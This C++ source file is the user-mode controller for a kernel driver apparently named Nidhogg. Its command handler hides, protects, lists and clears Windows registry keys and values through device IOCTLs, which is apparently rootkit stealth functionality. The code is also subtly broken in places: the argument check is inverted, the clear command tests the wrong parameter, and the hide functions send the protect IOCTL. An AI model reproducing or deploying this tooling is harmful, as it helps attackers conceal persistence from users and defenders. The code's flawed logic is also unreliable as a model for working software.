#include "pch.h"
#include "RegistryHandler.h"

/*
* Description:
* HandleCommand is responsible for handling commands related to registry operations.
*
* Parameters:
* @command [_In_ std::string] -- The command to be handled.
*
* Returns:
* There is no return value.
*/
void RegistryHandler::HandleCommand(_In_ std::string command) {
	std::vector<std::wstring> params = SplitStringBySpaceW(command);

	if (!params.empty()) {
		PrintHelp();
		return;
	}
	if (params.size() > 1 && !CheckInput(params)) {
		PrintHelp();
		return;
	}

	if (params.at(0) == L"add" || params.at(0) == L"protect") {
		if (params.size() == 3) {
			ProtectKey(params.at(1), true) ? std::wcout << L"Registry key " << params.at(1) << L" protected" << std::endl :
				std::wcerr << L"Failed to protect registry key " << params.at(1) << std::endl;
			return;
		}
		ProtectValue(params.at(1), params.at(2), true) ? std::wcout << L"Registry value " << params.at(2) << L" in key " 
			<< params.at(1) << L" protected" << std::endl :
			std::wcerr << L"Failed to protect registry value " << params.at(2) << L" in key " << params.at(1) 
			<< std::endl;
	} 
	else if (params.at(0) == L"remove" || params.at(0) == L"unprotect") {
		if (params.size() == 3) {
			ProtectKey(params.at(1), false) ? std::wcout << L"Removed protection from registry key " << params.at(1) << std::endl :
				std::wcerr << L"Failed to remove protection from registry key " << params.at(1) << std::endl;
			return;
		}
		ProtectValue(params.at(1), params.at(2), false) ? std::wcout << L"Removed protection from registry value " 
			<< params.at(2) << L" in key " << params.at(1) << std::endl :
			std::wcerr << L"Failed to remove protection from registry value " << params.at(2) << L" in key " 
			<< params.at(1) << std::endl;
	} 
	else if (params.at(0) == L"hide") {
		if (params.size() == 3) {
			HideKey(params.at(1), true) ? std::wcout << L"Registry key " << params.at(1) << L" hidden" << std::endl :
				std::wcerr << L"Failed to hide registry key " << params.at(1) << std::endl;
			return;
		}
		HideValue(params.at(1), params.at(2), true) ? std::wcout << L"Registry value " << params.at(2) 
			<< L" in key " << params.at(1) << L" hidden" << std::endl :
			std::wcerr << L"Failed to hide registry value " << params.at(2) << L" in key " 
		<< params.at(1) << std::endl;
	} 
	else if (params.at(0) == L"unhide" || params.at(0) == L"restore") {
		if (params.size() == 3) {
			HideKey(params.at(1), false) ? std::wcout << L"Registry key " << params.at(1) << L" revealed" << std::endl :
				std::wcerr << L"Failed to reveal registry key " << params.at(1) << std::endl;
			return;
		}
		HideValue(params.at(1), params.at(2), false) ? std::wcout << L"Registry value " << params.at(2) 
			<< L" in key " << params.at(1) << L" revealed" << std::endl :
			std::wcerr << L"Failed to reveal registry value " << params.at(2) << L" in key " 
		<< params.at(1) << std::endl;
	}
	else if (params.at(0) == L"list") {
		if (params.at(1) == L"hidden") {
			if (params.at(2) == L"keys") {
				std::vector<std::wstring> hiddenKeys = ListHiddenKeys();

				if (hiddenKeys.empty()) {
					std::wcout << L"No hidden registry keys found." << std::endl;
					return;
				}
				std::wcout << L"Hidden registry keys:" << std::endl;

				for (const auto& key : hiddenKeys) {
					std::wcout << key << std::endl;
				}
				return;
			}
			else if (params.at(2) == L"values") {
				auto hiddenValues = ListHiddenValues();

				if (hiddenValues.Values.empty()) {
					std::wcout << L"No hidden registry values found." << std::endl;
					return;
				}
				std::wcout << L"Hidden registry values:" << std::endl;

				for (SIZE_T i = 0; i < hiddenValues.Values.size(); i++) {
					std::wcout << L"Key: " << hiddenValues.Keys.at(i) << L", Value: "
						<< hiddenValues.Values.at(i) << std::endl;
				}
				return;
			}
		}

		else if (params.at(1) == L"protected") {
			if (params.at(2) == L"keys") {
				std::vector<std::wstring> protectedKeys = ListProtectedKeys();

				if (protectedKeys.empty()) {
					std::wcout << L"No protected registry keys found." << std::endl;
					return;
				}
				std::wcout << L"Protected registry keys:" << std::endl;

				for (const auto& key : protectedKeys) {
					std::wcout << key << std::endl;
				}
				return;
			}
			else if (params.at(2) == L"values") {
				auto protectedValues = ListProtectedValues();

				if (protectedValues.Values.empty()) {
					std::wcout << L"No protected registry values found." << std::endl;
					return;
				}
				std::wcout << L"Protected registry values:" << std::endl;

				for (SIZE_T i = 0; i < protectedValues.Values.size(); i++) {
					std::wcout << L"Key: " << protectedValues.Keys.at(i) << L", Value: "
						<< protectedValues.Values.at(i) << std::endl;
				}
				return;
			}
		}

		PrintHelp();
	}
	else if (params.at(1) == L"clear") {
		ClearAll();
	}
	else {
		PrintHelp();
	}
}

/*
* Description:
* CheckInput is responsible for checking the input parameters for registry commands.
* 
* Parameters:
* @params [_In_ const std::vector<std::string>&] -- The input parameters to be checked.
* 
* Returns:
* @bool											 -- Whether the input parameters are valid or not.
*/
bool RegistryHandler::CheckInput(_In_ const std::vector<std::wstring>& params) {
	if (params.size() != 3 && params.size() != 4) {
		std::cerr << "Invalid usage" << std::endl;
		return false;
	}
	
	return true;
}

/*
* Description:
* ParseRegistryKey is responsible for parsing the registry key from the input string.
* 
* Parameters:
* @key [_In_ const std::wstring&] -- The input string containing the registry key.
* 
* Returns:
* @std::wstring				 -- The parsed registry key.
*/
std::wstring RegistryHandler::ParseRegistryKey(_In_ const std::wstring& key) {
	std::wstring result = key;

	if (result.find(HKLM) != std::wstring::npos) {
		result.replace(0, 18, HKLM_HIVE);
	}
	else if (result.find(HKLM_SHORT) != std::wstring::npos) {
		result.replace(0, 4, HKLM_HIVE);
	}
	else if (result.find(HKCR) != std::wstring::npos) {
		std::wstring hkcruPath = HKU_HIVE;
		hkcruPath.append(L"\\");
		hkcruPath.append(GetCurrentUserSID());
		hkcruPath.append(L"_Classes");

		if (!hkcruPath.empty()) {
			result.replace(0, 17, hkcruPath);
		}
		else {
			result.replace(0, 17, HKCR_HIVE);
		}
	}
	else if (result.find(HKCR_SHORT) != std::wstring::npos) {
		std::wstring hkcruPath = HKU_HIVE;
		hkcruPath.append(L"\\");
		hkcruPath.append(GetCurrentUserSID());
		hkcruPath.append(L"_Classes");

		if (!hkcruPath.empty()) {
			result.replace(0, 4, hkcruPath);
		}
		else {
			result.replace(0, 4, HKCR_HIVE);
		}
	}
	else if (result.find(HKU) != std::wstring::npos) {
		result.replace(0, 10, HKU_HIVE);
	}
	else if (result.find(HKU_SHORT) != std::wstring::npos) {
		result.replace(0, 3, HKU_HIVE);
	}
	else if (result.find(HKCU) != std::wstring::npos) {
		std::wstring hkcuPath = HKU_HIVE;
		hkcuPath.append(L"\\");
		hkcuPath.append(GetCurrentUserSID());

		if (hkcuPath.compare(HKU_HIVE) == 0)
			throw RegistryHandlerException("Invalid HKCU path");
		result.replace(0, 17, hkcuPath);
	}
	else if (result.find(HKCU_SHORT) != std::wstring::npos) {
		std::wstring hkcuPath = HKU_HIVE;
		hkcuPath.append(L"\\");
		hkcuPath.append(GetCurrentUserSID());

		if (hkcuPath.compare(HKU_HIVE) == 0)
			throw RegistryHandlerException("Invalid HKCU path");
		result.replace(0, 4, hkcuPath);
	}
	else {
		throw RegistryHandlerException("Invalid registry path");
	}
	return result;
}

/*
* Description:
* ProtectKey is responsible for protecting or unprotecting a registry key.
* 
* Parameters:
* @key	   [_In_ const std::wstring&] -- The registry key to be protected or unprotected.
* @protect [_In_ bool]				  -- Whether to protect (true) or unprotect (false) the registry key.
* 
* Returns:
* @bool								  -- Whether the operation was successful or not.
*/
bool RegistryHandler::ProtectKey(_In_ const std::wstring& key, _In_ bool protect) {
	DWORD returned = 0;
	RegItem item{};
	std::wstring kernelSyntaxRegistryKey = L"";

	try {
		kernelSyntaxRegistryKey = ParseRegistryKey(key);
	}
	catch (const RegistryHandlerException& e) {
		std::wcerr << e.what() << std::endl;
		return false;
	}

	if (kernelSyntaxRegistryKey.length() > REG_KEY_LEN)
		return false;

	DWORD ioctl = protect ? IOCTL_PROTECT_REGITEM : IOCTL_UNPROTECT_REGITEM;
	wcscpy_s(item.KeyPath, kernelSyntaxRegistryKey.length() + 1, kernelSyntaxRegistryKey.data());
	item.Type = RegItemType::RegProtectedKey;

	return DeviceIoControl(hNidhogg.get(), ioctl, &item, sizeof(item), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* HideKey is responsible for hiding or unhiding a registry key.
* 
* Parameters:
* @key  [_In_ const std::wstring&] -- The registry key to be hidden or unhidden.
* @hide [_In_ bool]				   -- Whether to hide (true) or unhide (false) the registry key.
* 
* Returns:
* @bool							   -- Whether the operation was successful or not.
*/
bool RegistryHandler::HideKey(_In_ const std::wstring& key, _In_ bool hide) {
	DWORD returned = 0;
	RegItem item{};
	std::wstring kernelSyntaxRegistryKey = L"";

	try {
		kernelSyntaxRegistryKey = ParseRegistryKey(key);
	}
	catch (const RegistryHandlerException& e) {
		std::wcerr << e.what() << std::endl;
		return false;
	}
	if (kernelSyntaxRegistryKey.length() > REG_KEY_LEN)
		return false;
	DWORD ioctl = hide ? IOCTL_PROTECT_REGITEM : IOCTL_UNPROTECT_REGITEM;
	wcscpy_s(item.KeyPath, kernelSyntaxRegistryKey.length() + 1, kernelSyntaxRegistryKey.data());
	item.Type = RegItemType::RegHiddenKey;
	return DeviceIoControl(hNidhogg.get(), ioctl, &item, sizeof(item), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* ProtectValue is responsible for protecting or unprotecting a registry value.
* 
* Parameters:
* @key		 [_In_ const std::wstring&] -- The registry key containing the value to be protected or unprotected.
* @valueName [_In_ const std::wstring&] -- The name of the registry value to be protected or unprotected.
* @protect   [_In_ bool]			    -- Whether to protect (true) or unprotect (false) the registry value.
* 
* Returns:
* @bool									-- Whether the operation was successful or not.
*/
bool RegistryHandler::ProtectValue(_In_ const std::wstring& key, _In_ const std::wstring& valueName, _In_ bool protect) {
	DWORD returned = 0;
	RegItem item{};
	std::wstring kernelSyntaxRegistryKey = L"";

	try {
		kernelSyntaxRegistryKey = ParseRegistryKey(key);
	}
	catch (const RegistryHandlerException& e) {
		std::wcerr << e.what() << std::endl;
		return false;
	}
	if (kernelSyntaxRegistryKey.length() > REG_KEY_LEN || valueName.length() > REG_VALUE_LEN)
		return false;

	DWORD ioctl = protect ? IOCTL_PROTECT_REGITEM : IOCTL_UNPROTECT_REGITEM;
	wcscpy_s(item.KeyPath, kernelSyntaxRegistryKey.length() + 1, kernelSyntaxRegistryKey.data());
	wcscpy_s(item.ValueName, valueName.length() + 1, valueName.data());
	item.Type = RegItemType::RegProtectedValue;
	return DeviceIoControl(hNidhogg.get(), ioctl, &item, sizeof(item), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* 
* HideValue is responsible for hiding or unhiding a registry value.
* 
* Parameters:
* @key		 [_In_ const std::wstring&] -- The registry key containing the value to be hidden or unhidden.
* @valueName [_In_ const std::wstring&] -- The name of the registry value to be hidden or unhidden.
* @hide		 [_In_ bool]				-- Whether to hide (true) or unhide (false) the registry value.
* 
* Returns:
* @bool								    -- Whether the operation was successful or not.
*/
bool RegistryHandler::HideValue(_In_ const std::wstring& key, _In_ const std::wstring& valueName, _In_ bool hide) {
	DWORD returned = 0;
	RegItem item{};
	std::wstring kernelSyntaxRegistryKey = L"";

	try {
		kernelSyntaxRegistryKey = ParseRegistryKey(key);
	}
	catch (const RegistryHandlerException& e) {
		std::wcerr << e.what() << std::endl;
		return false;
	}
	if (kernelSyntaxRegistryKey.length() > REG_KEY_LEN || valueName.length() > REG_VALUE_LEN)
		return false;
	DWORD ioctl = hide ? IOCTL_PROTECT_REGITEM : IOCTL_UNPROTECT_REGITEM;
	wcscpy_s(item.KeyPath, kernelSyntaxRegistryKey.length() + 1, kernelSyntaxRegistryKey.data());
	wcscpy_s(item.ValueName, valueName.length() + 1, valueName.data());
	item.Type = RegItemType::RegHiddenValue;
	return DeviceIoControl(hNidhogg.get(), ioctl, &item, sizeof(item), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* ListProtectedKeys is responsible for listing all protected registry keys.
* 
* Parameters:
* There are no parameters.
* 
* Returns:
* @std::vector<std::wstring> -- A vector containing the names of all protected registry keys.
*/
std::vector<std::wstring> RegistryHandler::ListProtectedKeys() {
	RegItem result{};
	std::vector<std::wstring> keys;
	int amountOfKeys = 0;
	DWORD returned = 0;

	result.RegItemsIndex = 0;
	result.Type = RegItemType::RegProtectedKey;

	if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
		&result, sizeof(result),
		&result, sizeof(result), &returned, nullptr))
		throw RegistryHandlerException("Failed to list protected registry keys");
	amountOfKeys = result.RegItemsIndex;

	if (amountOfKeys == 0)
		return keys;

	keys.push_back(std::wstring(result.KeyPath));
	result.KeyPath[0] = L'\0';

	for (int i = 1; i < amountOfKeys; i++) {
		result.RegItemsIndex = i;

		if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
			nullptr, 0,
			&result, sizeof(result), &returned, nullptr)) {

			keys.clear();
			throw RegistryHandlerException("Failed to list protected registry keys");
		}

		keys.push_back(std::wstring(result.KeyPath));
		result.KeyPath[0] = L'\0';
	}

	return keys;
}

/*
* Description:
* ListHiddenKeys is responsible for listing all hidden registry keys.
* 
* Parameters:
* There are no parameters.
* 
* Returns:
* @std::vector<std::wstring> -- A vector containing the names of all hidden registry keys.
*/
std::vector<std::wstring> RegistryHandler::ListHiddenKeys() {
	RegItem result{};
	std::vector<std::wstring> keys;
	int amountOfKeys = 0;
	DWORD returned = 0;
	result.RegItemsIndex = 0;
	result.Type = RegItemType::RegHiddenKey;

	if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
		&result, sizeof(result),
		&result, sizeof(result), &returned, nullptr)) {
		throw RegistryHandlerException("Failed to list protected registry keys");
	}
	amountOfKeys = result.RegItemsIndex;

	if (amountOfKeys == 0)
		return keys;
	keys.push_back(std::wstring(result.KeyPath));
	result.KeyPath[0] = L'\0';

	for (int i = 1; i < amountOfKeys; i++) {
		result.RegItemsIndex = i;

		if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
			nullptr, 0,
			&result, sizeof(result), &returned, nullptr)) {
			keys.clear();
			throw RegistryHandlerException("Failed to list protected registry keys");
		}
		keys.push_back(std::wstring(result.KeyPath));
		result.KeyPath[0] = L'\0';
	}
	return keys;
}

/*
* Description:
* ListProtectedValues is responsible for listing all protected registry values.
* 
* Parameters:
* There are no parameters.
* 
* Returns:
* @RegistryQueryResult -- A structure containing the names of all protected registry keys and their values.
*/
RegistryQueryResult RegistryHandler::ListProtectedValues() {
	DWORD returned;
	RegItem result{};
	RegistryQueryResult queryResult{};
	int amountOfValues = 0;
	result.RegItemsIndex = 0;
	result.Type = RegItemType::RegProtectedValue;

	if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
		&result, sizeof(result),
		&result, sizeof(result), &returned, nullptr)) {
		queryResult.Values.clear();
		throw RegistryHandlerException("Failed to list protected registry values");
	}
	amountOfValues = result.RegItemsIndex;

	if (amountOfValues == 0)
		return queryResult;
	queryResult.Keys.push_back(std::wstring(result.KeyPath));
	queryResult.Values.push_back(std::wstring(result.ValueName));
	result.KeyPath[0] = L'\0';
	result.ValueName[0] = L'\0';

	for (int i = 1; i < amountOfValues; i++) {
		result.RegItemsIndex = i;

		if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
			nullptr, 0,
			&result, sizeof(result), &returned, nullptr)) {
			queryResult.Values.clear();
			queryResult.Keys.clear();
			throw RegistryHandlerException("Failed to list protected registry values");
		}
		queryResult.Keys.push_back(std::wstring(result.KeyPath));
		queryResult.Values.push_back(std::wstring(result.ValueName));
		result.KeyPath[0] = L'\0';
		result.ValueName[0] = L'\0';
	}
	return queryResult;
}

/*
* Description:
* ListHiddenValues is responsible for listing all hidden registry values.
* 
* Parameters:
* There are no parameters.
* 
* Returns:
* @RegistryQueryResult -- A structure containing the names of all hidden registry keys and their values.
*/
RegistryQueryResult RegistryHandler::ListHiddenValues() {
	DWORD returned = 0;
	RegItem result{};
	RegistryQueryResult queryResult{};
	int amountOfValues = 0;
	result.RegItemsIndex = 0;
	result.Type = RegItemType::RegHiddenValue;

	if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
		&result, sizeof(result),
		&result, sizeof(result), &returned, nullptr)) {
		queryResult.Values.clear();
		throw RegistryHandlerException("Failed to list hidden registry values");
	}
	amountOfValues = result.RegItemsIndex;

	if (amountOfValues == 0)
		return queryResult;
	queryResult.Keys.push_back(std::wstring(result.KeyPath));
	queryResult.Values.push_back(std::wstring(result.ValueName));
	result.KeyPath[0] = L'\0';
	result.ValueName[0] = L'\0';

	for (int i = 1; i < amountOfValues; i++) {
		result.RegItemsIndex = i;

		if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
			nullptr, 0,
			&result, sizeof(result), &returned, nullptr)) {
			queryResult.Values.clear();
			queryResult.Keys.clear();
			throw RegistryHandlerException("Failed to list hidden registry values");
		}
		queryResult.Keys.push_back(std::wstring(result.KeyPath));
		queryResult.Values.push_back(std::wstring(result.ValueName));
		result.KeyPath[0] = L'\0';
		result.ValueName[0] = L'\0';
	}
	return queryResult;
}

/*
* Description:
* ClearAll is responsible for clearing all registry protections and hiding.
* 
* Parameters:
* There are no parameters.
* 
* Returns:
* @bool -- Whether the operation was successful or not.
*/
bool RegistryHandler::ClearAll() {
	DWORD returned;
	return DeviceIoControl(hNidhogg.get(), IOCTL_CLEAR_REGITEMS, nullptr, 0, nullptr, 0, &returned, nullptr);
}